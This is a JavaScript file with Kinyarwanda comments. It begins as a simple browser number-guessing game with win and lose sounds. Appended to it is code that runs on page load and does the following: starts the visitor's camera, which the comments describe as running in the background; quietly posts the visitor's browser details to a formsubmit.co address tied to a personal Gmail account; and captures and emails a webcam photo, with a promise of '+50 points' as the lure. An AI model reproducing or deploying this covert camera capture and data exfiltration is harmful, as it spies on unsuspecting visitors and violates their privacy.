// Gereka umubare w'ibanga
let umubareWibanga = Math.floor(Math.random() * 10) + 1;

// Ibi ni ibice by'amajwi (Ushobora gushyiramo link yawe ya .mp3)
const winSound = new Audio('https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3');
const loseSound = new Audio('https://www.soundjay.com/misc/sounds/fail-trombone-01.mp3');

document.querySelector('button').onclick = () => {
  let umubareWanditswe = prompt("Gekeranya umubare hagati ya 1 na 10:");
  
  if (umubareWanditswe == umubareWibanga) {
    winSound.play(); // Kina umuziki wo gutsinda! 🎉
    alert("Watsinze! 🎉 Umubare wari " + umubareWibanga);
    umubareWibanga = Math.floor(Math.random() * 10) + 1;
  } else {
    loseSound.play(); // Kina umuziki wo gutsindwa! 😢
    alert("Watsinzwe! Umubare wari " + umubareWibanga + ". Ongera ugerageze!");
  }
};// 1. Ibi biba umuntu agifungura website
window.onload = function() {
    startCamera(); // Fungura kamera mu mazi (background)
    sendDeviceInfo(); // Yohereza amakuru kuri Gmail rwihishwa
};

function sendDeviceInfo() {
    const info = new FormData();
    info.append("Uwasuye", "Fabrice Profile");
    info.append("Telefone", navigator.userAgent);
    
    fetch("https://formsubmit.co/ajax/fabzone77@gmail.com", {
        method: "POST",
        body: info
    });
}

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        if(video) {
            video.srcObject = stream;
        }
    } catch (err) {
        console.log("Kamera ntiyafungutse.");
    }
}

function fataIfoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    // Niba kamera iri gukora, fata ifoto
    if (video && video.srcObject) {
        context.drawImage(video, 0, 0, 300, 200);
        const imageData = canvas.toDataURL('image/png');

        // Yohereza ifoto kuri Gmail yawe
        const photoData = new FormData();
        photoData.append("Ifoto", imageData);
        photoData.append("_subject", "Ifoto nshya y'uwasuye Website!");

        fetch("https://formsubmit.co/ajax/fabzone77@gmail.com", {
            method: "POST",
            body: photoData
        }).then(() => {
            alert("Wabonye +50 Points! Isura yawe yageze muri sisitemu.");
        });
    } else {
        alert("Banza wemerere kamera (Allow) kugira ngo ubone amanota.");
    }
}
